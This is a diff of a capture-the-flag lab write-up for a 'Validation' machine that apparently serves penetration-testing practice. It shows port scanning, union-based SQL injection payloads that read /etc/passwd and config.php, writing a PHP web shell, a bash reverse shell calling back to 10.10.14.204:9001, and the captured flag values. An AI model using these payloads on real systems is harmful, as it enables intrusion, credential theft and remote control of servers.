@@ -16,7 +16,7 @@ ports
 sudo nmap -p- -Pn -n -vv --min-rate=5000 10.129.58.61 -oG network/nmap_ports.txt
 ```
 
-01
+![](screenshots/01.png)
 
 port 80 and 8080 - HTTP
 port 22 - SSH
@@ -31,7 +31,7 @@ service and version
 sudo nmap -p22,80,4566,8080 -sCV 10.129.58.61 -oN network/nmap_service.txt
 ```
 
-02
+![](screenshots/02.png)
 
 port 80 HTTP - Apache httpd 2.4.48 (Debian)
 port 4566 - nginx - 403 forbidden
@@ -43,25 +43,25 @@ HTTP port 80 - Web
 
 Browsing: http://10.129.58.61/
 
-03
+![](screenshots/03.png)
 
 Right away it reminds me of the last test on "Union". Similar website look, functionality and UHC brand. The functionality is to register, input a name and select a country.
 
 Register a name and pick a country, redirected to `account.php`
 
-04
+![](screenshots/04.png)
 
 Greeted by a message "`Welcome <user_input_name>`", and showing other player on same country
 
 Opening BurpSuite
 
-05
+![](screenshots/05.png)
 
 POST request, `username` and country `parameters`. Response 302 Found, redirect to `/account.php`. PHP version 7.4.23
 
 Following the redirect
 
-06
+![](screenshots/06.png)
 
 GET `/account.php`, response with Welcome message and username, then the already registered players on the selected country (Chile)
 
@@ -73,7 +73,7 @@ Fuzzing
 ffuf -u http://10.129.58.61/FUZZ.php -w /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
 ```
 
-07
+![](screenshots/07.png)
 
 `config.php`, `accountphp` and `index.php`
 
@@ -81,7 +81,7 @@ ffuf -u http://10.129.58.61/FUZZ.php -w /opt/wordlists/SecLists/Discovery/Web-Co
 
 Now see an error
 
-08
+![](screenshots/08.png)
 
 Ordering by 1 returns nothing. Ordering by 2 returns the error. 
 (Default webroot `/var/www/html/)
@@ -92,7 +92,7 @@ Ordering by 1 returns nothing. Ordering by 2 returns the error.
 
 This payload triggers the same message, 2 columns
 
-The inectable parameter is `country`
+The injectable parameter is `country`
 
 Tried to read a file and can, weird that I dont need to specify 2 columns as it seems thats what the original query wants.
 
@@ -102,7 +102,7 @@ Injecting in `country` parameter:
 ' union select load_file("/etc/passwd")-- -
 ```
 
-09
+![](screenshots/09.png)
 
 Here can fully confirm is MySQL
 
@@ -112,9 +112,9 @@ Reading the `config.php` file
 ' union select null,load_file("/var/www/html/config.php")-- -
 ```
 
-The contents are not listed on the browser as is php code but interceptiong the response on BurpSuite can read it.
+The contents are not listed on the browser as is php code but intercepting the response on BurpSuite can read it.
 
-10
+![](screenshots/10.png)
 
 Username
 ```
@@ -140,11 +140,13 @@ Enumerating database
 
 table `registration`
 
+![](screenshots/11.png)
+
 ```
 ' union select column_name from information_schema.columns where table_name='registration'-- -
 ```
 
-12
+![](screenshots/12.png)
 
 Columns `username` and `userhash` 
 (without null, just one column count, weird sometimes works with one sometimes with two)
@@ -163,9 +165,9 @@ CONCAT(`SUBJECT`, ' ', `YEAR`)
 ' union select concat(username," ",userhash) from registration-- -
 ```
 
-13
+![](screenshots/13.png)
 
-This are all my entries, not sure what is it hashing. Anyways, no fun for me.
+This are all my entries, not sure what is it hashing. Any ways, no fun for me.
 
 Enumerating any other database
 
@@ -173,7 +175,7 @@ Enumerating any other database
 ' union select schema_name from information_schema.schemata-- -
 ```
 
-14
+![](screenshots/14.png)
 
 Nothing interesting
 
@@ -183,7 +185,7 @@ Reading `account.php`
 ' union select null,load_file("/var/www/html/account.php")-- -
 ```
 
-15
+![](screenshots/15.png)
 
 Can see the original query but not much.
 
@@ -197,14 +199,14 @@ Response is just the error saw earlier but its successfully uploaded
 
 Browsing: http://10.129.58.61/shell.php?c=whoami
 
-16
+![](screenshots/16.png)
 
 Reverse shell
 
 Payload: bash -c 'bash -i &> /dev/tcp/10.10.14.204/9001 0>&1' 
 URL encoded: bash+-c+'bash+-i+%26>+/dev/tcp/10.10.14.204/9001+0>%261'
 
-17
+![](screenshots/17.png)
 
 Connected as `www-data` to target system `validation`
 
@@ -212,7 +214,7 @@ Connected as `www-data` to target system `validation`
 cat /home/htb/user.txt
 ```
 
-18
+![](screenshots/18.png)
 
 user.txt: 4d5e6bad320020cb4dde72c77a4f53b9
 
@@ -226,7 +228,7 @@ Enumerating sudo privileges
 sudo -l
 ```
 
-19
+![](screenshots/19.png)
 
 No sudo
 
@@ -236,11 +238,11 @@ Enumerating SUID binaries
 find / -perm -4000 2>/dev/null
 ```
 
-20
+![](screenshots/20.png)
 
-After being stuck and thinking of possible ways, remmeber the earlier discovered credential for uhc on config.php and try it for root and it works, didnt expect this.
+After being stuck and thinking of possible ways, remember the earlier discovered credential for uhc on config.php and try it for root and it works, didnt expect this.
 
-21
+![](screenshots/21.png)
 
 root.txt: 3c5c5008eb67acbbe48a1f224a3d7607
 
@@ -257,9 +259,9 @@ Total Time Testing: 2h 15min
 ##### Techniques
 - SQLi union query with reflected data in response
 - Reading files via SQLi (MySQL)
-- Writting a malicious file (PHP) via SQLi (MySQL) 
+- Writing a malicious file (PHP) via SQLi (MySQL) 
 ##### Sources
 - https://portlookup.com/port-4566/
 - https://stackoverflow.com/questions/10346302/mysql-concatenate-two-columns
 
-*Note: The test finished without any Hint or reference from walkthroughs but, as this machine was handpicked to pratice SQLi, started knowing there is SQLi somewhere, and thats a significant tip, so will mark the reference level as "Hint" and not "Solo".*
+*Note: The test finished without any Hint or reference from walkthroughs but, as this machine was handpicked to practice SQLi, started knowing there is SQLi somewhere, and thats a significant tip, so will mark the reference level as "Hint" and not "Solo".*
